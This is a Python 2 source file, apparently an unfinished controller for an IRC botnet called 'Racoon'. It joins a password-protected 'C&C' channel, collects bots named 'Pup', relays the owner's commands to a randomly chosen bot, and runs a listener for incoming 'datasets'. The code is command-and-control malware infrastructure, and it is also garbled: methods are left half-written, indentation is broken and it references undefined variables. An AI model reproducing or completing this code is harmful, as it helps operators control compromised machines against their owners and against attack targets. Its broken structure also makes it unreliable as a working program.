#!/usr/bin/python
# -*- coding: utf-8 -*-

import re, signal, sys
from random import choice, randint
from connection import *
from server import Serv, Client
from multiprocessing import Process, Queue
from Queue import Empty
from time import sleep

nick      = "Racoon"
channel   = "#Tanuki"
password  = "ohlookyouknowthepassword"
usessl    = True
pups      = []
owner     = "nobody@blackcatz-jk9.aoi.0gvrju.IP"

def signal_handler( signal, frame ):
    """ Gracefully exit on SIGINT """
    print "\n[+] Quitting"
    sys.exit( 0 )

class Racoon:

    def __init__( self, nick, chost, cport, cchan, cpass, owner, lhost, lport, verbose ):

        self.config = {
            "nick"     : nick,
            "chost"    : chost,
            "cport"    : cport,
            "cchan"    : cchan,
            "cpass"    : cpass,
            "owner"    : owner,
            "lhost"    : lhost,
            "lport"    : lport,
            "verbose"  : verbose
        }

        self.state = {
            "connected"  : False,
            "identified" : False,
            "inchan"     : False,
            "listening"  : False,
            "free_pups"  : [],
            "busy_pups"  : [],
            "ircin"      : Queue(),
            "ircout"     : Queue(),
            "servin"     : Queue(),
            "irc"        : None,
            "serv"       : None
        }

        self.racoon = {
            "irc"    : None,
            "serv"   : None,
        }

    def _send_to_bot_( self, msg ):
    
        if owner in msg:
            send = ":".join( [ x for x in text.split( ":" )[3:] ] ).lstrip()
            elem = choice( pups )
            for i in pups:
                if elem in i:
                        
                    self.racoon["irc"].msg_channel( 
                        channel, "{}: {}".format( elem, msg ) 
                    )
        else:
            pass

    def _ircin_( self, queue ):
        """ parse data recv from irc """
        while True:
            
            self.msg = queue.get_nowait()
            if self.msg is not None:
                
                if "PRIVMSG #Tanuki :{}:".format( nick ) in self.msg:
                    """ relay command to random bot """
                    
    
    if "PRIVMSG #Tanuki :{}:".format( nick ) in text:
        """ relay command to random bot """
        if owner in text:
            msg = ":".join( [ x for x in text.split( ":" )[3:] ] ).lstrip()
            elem = choice( pups )
            for i in pups:
                if elem in i:
                    racoon.msg_channel( channel, "{}: {}".format( elem, msg ) )


    def _connect_to_CNC_( self ):
        """ Connect to CNC """
        try:
            self.racoon["irc"] = Connection( chost, cport, usessl )
            self.racoon["irc"].ident( self.nick, self.nick, self.nick )
            self.racoon["irc"].set_nick( self.nick )
            self.state["connected"] = True
            self.state["identified"] = True
            
            print "[+] Connection to {}:{} established".format( 
                self.config["chost"], self.config["cport"] 
            )

        except Exception as E:
            print "[!] Failed to connect to CNC - Error: {}".format( E )
            sys.exit()

    def _start_server_( self ):
        """ Start server """
        try:
            self.racoon["server"] = Serv( self.config["lhost"], self.config["lport"] )
            self.state["serv"] = Process( target=self.server.run )
            self.state["serv"].daemon = True
            self.state["serv"].start()
            
            print "[+] Listening for datasets on {}:{}".format( 
                self.config["lhost"], self.config["lport"] 
            )

        except Exception as E:
            print "[!] Failed to start server - Error: {}".format( E )

    def run( self ):

        while self.state["connected"] is True:
            """ recv data into process queue """



                



while 1:

    signal.signal( signal.SIGINT, signal_handler )
    text  = racoon.recv( 4096 )
    

    if text.find( "396" ) != -1:
        """ join after opcode """
        print "[+] Joining C&C channel"
        racoon.join_channel( channel, password )

    """ rally pups """
    racoon.get_names( channel )
    if text.find( "353" ) != -1:
        for name in text.split( ":" )[2].split( " " ):
            if name.startswith( "Pup" ):
                if name not in pups:
                    pups.append( name )
                    print "[+] Added {}".format( name )
                    racoon.msg_channel( channel, "{}: こんにちは".format( name ) )

    if "QUIT" in text:
        for pup in pups:
            if pup in text:
                """ remove pup from litter """
                pups.remove( pup )
                racoon.msg_channel( channel, "\033[1;31mさようなら :(\033m[0m" )
                print "[!] Lost {}".format( pup )

    if text.find( "PING" ) != -1:
	"""kinda need this"""
        racoon.ping( text.split()[1]+"\r\n" )
        print "[+] Sent a ping"
